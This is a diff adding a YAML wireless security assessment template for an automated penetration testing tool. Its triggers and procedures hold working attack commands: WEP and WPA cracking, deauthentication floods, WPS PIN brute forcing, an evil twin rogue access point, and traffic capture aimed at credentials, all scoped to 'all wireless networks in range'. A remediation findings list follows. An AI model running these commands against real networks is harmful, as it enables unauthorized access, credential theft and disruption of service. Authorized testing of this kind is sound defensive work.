@@ -1,0 +1,247 @@
+id: "wireless_assessment"
+version: "1.0.0"
+template_version: "1.0"
+name: "Wireless Security Assessment"
+workstream: "Wireless Testing"
+author: "Security Team"
+created: "2024-01-01"
+modified: "2024-01-01"
+status: "active"
+description: "Comprehensive wireless network security assessment methodology"
+tags: ["wireless", "wifi", "bluetooth", "802.11", "wpa", "wep"]
+risk_level: "high"
+
+overview:
+  purpose: "Assess wireless network security configurations and identify vulnerabilities"
+  scope: "All wireless networks and devices in range"
+  prerequisites:
+    - "Wireless adapter with monitor mode capability"
+    - "Physical proximity to target wireless networks"
+    - "Appropriate tools (aircrack-ng, kismet, etc.)"
+  category: "Wireless Assessment"
+
+triggers:
+  - name: "Wireless Network Discovered"
+    description: "New wireless network detected - perform initial assessment"
+    conditions:
+      asset_type: "wirelessNetwork"
+      properties:
+        "discovered": "true"
+        "assessed": "false"
+    priority: 90
+    batch_capable: true
+    batch_criteria: "frequency_band"
+    max_batch_size: 20
+    batch_command: "airodump-ng --band <frequency> -w capture <interface>"
+    individual_command: "airodump-ng -c <channel> --bssid <bssid> -w <network_name> <interface>"
+    command_variants:
+      quick: "airodump-ng -c <channel> --bssid <bssid> <interface>"
+      thorough: "airodump-ng -c <channel> --bssid <bssid> -w <network_name> --output-format pcap,csv,kismet <interface>"
+    expected_property_updates: ["encryption_type", "signal_strength", "client_count", "channel"]
+    expected_asset_discovery: ["wirelessClient"]
+    tags: ["discovery", "monitoring"]
+    cooldown_period: "10m"
+    enabled: true
+
+  - name: "WEP Network Detected"
+    description: "WEP encrypted network found - attempt to crack"
+    conditions:
+      asset_type: "wirelessNetwork"
+      properties:
+        "encryption": "WEP"
+        "cracked": "false"
+    priority: 100
+    batch_capable: false
+    individual_command: "aircrack-ng -a 1 -b <bssid> <capture_file>"
+    command_variants:
+      passive: "aircrack-ng -a 1 -b <bssid> <capture_file>"
+      active: "aireplay-ng -1 0 -a <bssid> -h <client_mac> <interface> && aircrack-ng -a 1 -b <bssid> <capture_file>"
+    expected_property_updates: ["wep_key", "cracked", "access_level"]
+    tags: ["wep_cracking", "encryption_bypass"]
+    cooldown_period: "30m"
+    enabled: true
+
+  - name: "WPA/WPA2 Network Detected"
+    description: "WPA/WPA2 encrypted network found - capture handshake"
+    conditions:
+      asset_type: "wirelessNetwork"
+      properties:
+        "encryption": "WPA2"
+        "handshake_captured": "false"
+    priority: 85
+    batch_capable: false
+    individual_command: "airodump-ng -c <channel> --bssid <bssid> -w <network_name> <interface>"
+    command_variants:
+      passive: "airodump-ng -c <channel> --bssid <bssid> -w <network_name> <interface>"
+      deauth: "aireplay-ng --deauth 10 -a <bssid> <interface>"
+    expected_property_updates: ["handshake_captured", "client_macs"]
+    tags: ["wpa_handshake", "deauth_attack"]
+    cooldown_period: "15m"
+    enabled: true
+
+  - name: "WPA Handshake Captured"
+    description: "WPA handshake obtained - attempt dictionary attack"
+    conditions:
+      asset_type: "wirelessNetwork"
+      properties:
+        "handshake_captured": "true"
+        "password_cracked": "false"
+    priority: 95
+    batch_capable: true
+    batch_criteria: "encryption_type"
+    max_batch_size: 5
+    batch_command: "hashcat -m 2500 -a 0 <handshake_files> <wordlist>"
+    individual_command: "aircrack-ng -a 2 -b <bssid> -w <wordlist> <capture_file>"
+    command_variants:
+      dictionary: "aircrack-ng -a 2 -b <bssid> -w <wordlist> <capture_file>"
+      hashcat: "hashcat -m 2500 -a 0 <handshake_file> <wordlist>"
+      john: "john --wordlist=<wordlist> --format=wpapsk <handshake_file>"
+    expected_property_updates: ["wpa_password", "password_cracked", "access_level"]
+    tags: ["password_cracking", "dictionary_attack"]
+    cooldown_period: "60m"
+    enabled: true
+
+  - name: "Open Network Detected"
+    description: "Open wireless network found - assess captive portal and traffic"
+    conditions:
+      asset_type: "wirelessNetwork"
+      properties:
+        "encryption": "Open"
+        "connected": "false"
+    priority: 75
+    batch_capable: false
+    individual_command: "iwconfig <interface> essid \"<ssid>\""
+    command_variants:
+      connect: "iwconfig <interface> essid \"<ssid>\""
+      monitor: "tcpdump -i <interface> -w <capture_file>"
+    expected_property_updates: ["captive_portal", "connected", "traffic_captured"]
+    expected_asset_discovery: ["networkTraffic"]
+    tags: ["open_network", "traffic_analysis"]
+    cooldown_period: "5m"
+    enabled: true
+
+  - name: "WPS Enabled Network"
+    description: "WPS enabled network detected - attempt PIN attack"
+    conditions:
+      asset_type: "wirelessNetwork"
+      properties:
+        "wps_enabled": "true"
+        "wps_cracked": "false"
+    priority: 90
+    batch_capable: false
+    individual_command: "reaver -i <interface> -b <bssid> -vv"
+    command_variants:
+      standard: "reaver -i <interface> -b <bssid> -vv"
+      pixie_dust: "reaver -i <interface> -b <bssid> -vv -K"
+    expected_property_updates: ["wps_pin", "wpa_password", "wps_cracked"]
+    tags: ["wps_attack", "pin_brute_force"]
+    cooldown_period: "45m"
+    enabled: true
+
+  - name: "Bluetooth Device Discovered"
+    description: "Bluetooth device detected - enumerate services"
+    conditions:
+      asset_type: "bluetoothDevice"
+      properties:
+        "discovered": "true"
+        "enumerated": "false"
+    priority: 70
+    batch_capable: true
+    batch_criteria: "device_class"
+    max_batch_size: 10
+    batch_command: "hcitool scan && sdptool browse <mac_addresses>"
+    individual_command: "sdptool browse <mac_address>"
+    command_variants:
+      scan: "hcitool scan"
+      services: "sdptool browse <mac_address>"
+      info: "hcitool info <mac_address>"
+    expected_property_updates: ["device_name", "services", "device_class"]
+    tags: ["bluetooth_enum", "service_discovery"]
+    cooldown_period: "10m"
+    enabled: true
+
+  - name: "Wireless Client Connected"
+    description: "Client connected to compromised network - analyze traffic"
+    conditions:
+      asset_type: "wirelessClient"
+      properties:
+        "connected": "true"
+        "traffic_analyzed": "false"
+    priority: 80
+    batch_capable: false
+    individual_command: "tcpdump -i <interface> host <client_ip> -w <capture_file>"
+    expected_property_updates: ["traffic_patterns", "protocols_used", "sensitive_data"]
+    expected_asset_discovery: ["networkTraffic", "credential"]
+    tags: ["traffic_analysis", "client_monitoring"]
+    cooldown_period: "20m"
+    enabled: true
+
+procedures:
+  - id: "wireless_discovery"
+    name: "Wireless Network Discovery"
+    description: "Discover and enumerate wireless networks"
+    commands:
+      - "iwlist scan"
+      - "airodump-ng <interface>"
+      - "kismet -c <interface>"
+
+  - id: "wep_cracking"
+    name: "WEP Encryption Cracking"
+    description: "Crack WEP encrypted networks"
+    commands:
+      - "airodump-ng -c <channel> --bssid <bssid> -w capture <interface>"
+      - "aireplay-ng -1 0 -a <bssid> <interface>"
+      - "aircrack-ng -a 1 capture*.cap"
+
+  - id: "wpa_cracking"
+    name: "WPA/WPA2 Encryption Cracking"
+    description: "Capture and crack WPA/WPA2 handshakes"
+    commands:
+      - "airodump-ng -c <channel> --bssid <bssid> -w handshake <interface>"
+      - "aireplay-ng --deauth 10 -a <bssid> <interface>"
+      - "aircrack-ng -a 2 -b <bssid> -w wordlist.txt handshake*.cap"
+
+  - id: "evil_twin"
+    name: "Evil Twin Attack"
+    description: "Create rogue access point to capture credentials"
+    commands:
+      - "hostapd evil_twin.conf"
+      - "dnsmasq -C dnsmasq.conf"
+      - "iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"
+
+findings:
+  - id: "WIFI-001"
+    title: "Weak Wireless Encryption"
+    severity: "high"
+    description: "Wireless network using weak or outdated encryption (WEP/WPS)"
+    remediation: "Upgrade to WPA3 or WPA2 with strong pre-shared key"
+
+  - id: "WIFI-002"
+    title: "Default Wireless Credentials"
+    severity: "high"
+    description: "Wireless network using default or weak credentials"
+    remediation: "Change default credentials and use strong, unique passwords"
+
+  - id: "WIFI-003"
+    title: "Open Wireless Network"
+    severity: "medium"
+    description: "Wireless network configured without encryption"
+    remediation: "Enable WPA3 or WPA2 encryption with strong authentication"
+
+  - id: "WIFI-004"
+    title: "WPS Vulnerability"
+    severity: "high"
+    description: "WPS enabled allowing PIN brute force attacks"
+    remediation: "Disable WPS functionality on wireless access points"
+
+  - id: "WIFI-005"
+    title: "Wireless Information Disclosure"
+    severity: "low"
+    description: "Wireless network broadcasts identifying information"
+    remediation: "Disable SSID broadcast and implement MAC address filtering"
+
+  - id: "BT-001"
+    title: "Bluetooth Device Discoverable"
+    severity: "medium"
+    description: "Bluetooth device configured in discoverable mode"
+    remediation: "Configure Bluetooth devices as non-discoverable when not pairing"
